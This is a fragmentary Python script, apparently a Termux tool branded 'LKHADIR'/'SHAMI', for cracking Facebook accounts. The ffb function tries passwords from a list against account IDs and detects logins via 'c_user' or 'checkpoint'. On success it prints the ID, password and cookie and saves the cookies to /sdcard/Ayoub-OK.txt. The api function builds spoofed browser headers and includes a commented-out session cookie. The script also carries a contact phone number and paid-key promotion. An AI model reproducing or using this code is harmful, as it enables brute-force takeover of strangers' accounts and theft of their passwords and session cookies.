...
\033[1;97m====================================================
\033[1;97m[+]\033[1;95m    WHATSAPP \033[1;90m: \033[1;93m+212617076646
\033[1;97m[+]\033[1;95m    VERSION  \033[1;90m:\033[1;93m0.0
\033[1;97m[+]\033[1;95m    STATUS \033[1;90m: \033[1;93mFREE
\033[1;97m[+]\033[1;95m    SUPPORTER \033[1;90m: \033[1;93m BY LKHADIR
\033[1;97m====================================================
"""
...
\033[1;97m[+]\033[1;95m    VERSION  \033[1;90m:\033[1;93m0.0
\033[1;97m[+]\033[1;95m    STATUS \033[1;90m: \033[1;93mFREE
\033[1;97m[+]\033[1;95m    Total ids  \033[1;90m: \033[1;93m {total_ids}
\033[1;97m===================================================="""+'\n')
                ...
                os.system(f'xdg-open https://chat.whatsapp.com/{wx}')
                menu()
            elif xd in ['7', '07']:
                os.system('xdg-open https://t.me/MR_Y_A_D_A_404')
                menu()
            elif xd in ['8', '08']:
                os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl')
                menu()
            elif xd in ['0', '00']:
                exit(' Thanks for use 🥰 ')
            else:
            ...
            print("\033[1;31m Your Not Premium User...!\033[1;37m")
            time.sleep(1)
            clear()
            ...
            linex()
            tks = f"Hi SHAMI Sir, I Need To Buy Your Paid SHAMI PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- {name}\n Key :- {fkeyx}"
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;32m [LKHADIR] %s | \033[1;32mOK:%s | CP:%s  [LKHADIR]\033[1;37m'%(loop, len(oks),len(cps)))
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAMI:
                                ...
                                numi=len(oks)+1
                                print("\033[92m" + """
 ______________(OK)______________________________
|                                                           
|♚ - ID >> %s
|♚ - Pass >> %s
|♚ - N° >> %s
...
""" % (ids, pas,numi,kuki))
                                ...
                                open('/sdcard/Ayoub-OK.txt', 'a').write('\n'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SHAMI:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [HAMA404-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
    ...
    'accept-language': 'en-IQ,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=EZP1ZQzpCCDtyytFdPUQxtC1; sb=EZP1ZQVc8_QIURLaCSPqxatf; m_pixel_ratio=3; ps_n=0; ps_l=0; locale=cb_IQ; vpd=v1%3B662x360x3; fr=0DCznmX4dwabkdxzq.AWXn4jBxJFFE3zv0-8TSTrNeoGA.Bl9ZMR..AAA.0.0.Bl9ZTr.AWWZh6KLjPU; wd=360x662',
    'dpr': '3',
